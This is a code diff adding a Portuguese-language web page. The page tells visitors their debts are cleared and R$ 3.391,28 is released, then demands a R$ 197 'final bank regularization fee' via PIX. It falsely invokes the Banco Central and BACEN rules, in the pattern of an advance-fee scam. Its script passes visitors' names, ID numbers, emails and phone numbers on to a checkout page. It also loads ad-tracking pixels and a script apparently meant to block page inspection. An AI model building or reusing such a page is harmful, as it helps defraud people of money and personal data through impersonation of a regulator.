@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Etapa Final de Regularização</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #f4f7fb, #ffffff);
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+
+    .header {
+      background-color: #002776;
+      color: #fff;
+      text-align: center;
+      padding: 18px;
+      font-size: 18px;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+
+    .container {
+      max-width: 650px;
+      margin: 30px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+      text-align: center;
+    }
+
+    .valor-box {
+      background: #f0f7ff;
+      border: 2px solid #d1e3ff;
+      padding: 20px;
+      border-radius: 12px;
+      margin: 20px 0;
+    }
+
+    .valor-box h2 {
+      margin: 0;
+      font-size: 22px;
+      color: #002776;
+    }
+
+    .valor-box p {
+      font-size: 18px;
+      color: #444;
+      margin: 5px 0 0 0;
+    }
+
+    .copy {
+      font-size: 17px;
+      line-height: 1.6;
+      margin: 20px 0;
+    }
+
+    .taxa {
+      background: #fff5f0;
+      border: 1px solid #ffc5b5;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 20px 0;
+      font-size: 16px;
+      color: #b02a1f;
+      font-weight: bold;
+    }
+
+    .desconto {
+      color: #0a7d2a;
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 15px 25px;
+      background-color: #0a7d2a;
+      color: #fff;
+      font-size: 18px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #086a22;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: #777;
+      margin-top: 25px;
+    }
+  </style>
+<!-- Meta Pixel g26 -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1094955653523354');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1094955653523354&ev=PageView&noscript=1" /></noscript>
+<!-- Utmify g26 -->
+<script>
+window.pixelId = "I3rkjjxZonP50FzjkStNJrm899HjlSfkD1JZ";
+var _utmify_g26 = document.createElement("script");
+_utmify_g26.setAttribute("async", "");
+_utmify_g26.setAttribute("defer", "");
+_utmify_g26.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+document.head.appendChild(_utmify_g26);
+</script>
+
+</head>
+<body>
+  <div class="header">
+    ⚖️ Regularização Bancária – Etapa Final
+  </div>
+
+  <div class="container">
+    <h1>Última Confirmação Antes do Saque</h1>
+
+    <div class="valor-box">
+      <h2>Valor autorizado para depósito:</h2>
+      <p><strong>R$ 3.391,28</strong></p>
+    </div>
+
+    <p class="copy">
+      Seus débitos foram quitados com sucesso e o valor já está liberado para sua conta bancária.
+      <br><br>
+      Para concluir a operação, é necessário o pagamento da <strong>Taxa Final de Regularização Bancária</strong>.
+      Essa etapa garante a confirmação com o Banco Central e evita bloqueios futuros em seu PIX.
+    </p>
+
+    <div class="taxa">
+      Taxa administrativa original: <del>R$ 350,00</del>
+      <div class="desconto">✅ Valor com desconto aplicado: <strong>R$ 197,00</strong></div>
+    </div>
+
+    <a href="../pagamento/pix.html?produto=up7" class="btn" id="btnCheckout">
+  ✅ Confirmar Regularização e Receber
+</a>
+
+
+    <div class="footer">
+      Sistema de Compensação Bancária – Processo regulado conforme normas do BACEN.<br>
+      Última etapa obrigatória para liberação do crédito.
+    </div>  
+  </div>
+  
+  <script>
+function getParams() {
+  const params = {};
+  const query = window.location.search.substring(1).split("&");
+  query.forEach(part => {
+    const [key, value] = part.split("=");
+    if (key) params[key] = decodeURIComponent((value || "").replace(/\+/g, " "));
+  });
+  return params;
+}
+
+function redirectToCheckout(e) {
+  e.preventDefault();
+  const params = getParams();
+
+  const checkoutBase = "../pagamento/pix.html?produto=up7"; // substitua pelo link real
+
+  const checkoutParams = new URLSearchParams({
+    name: params.name || "",
+    document: params.document || "",
+    email: params.email || "",
+    telephone: params.telephone || ""
+  });
+
+  if (params.utm_source) checkoutParams.set("utm_source", params.utm_source);
+  if (params.utm_campaign) checkoutParams.set("utm_campaign", params.utm_campaign);
+
+  window.location.href = checkoutBase + "?" + checkoutParams.toString();
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  const btn = document.querySelector("#btnCheckout");
+  if (btn) {
+    btn.addEventListener("click", redirectToCheckout);
+  }
+});
+</script>
+
+<script src="../assets/js/up-checkout-local.js"></script>
+<script src="../assets/js/block-inspect.js" defer></script>
+</body>
+</html>
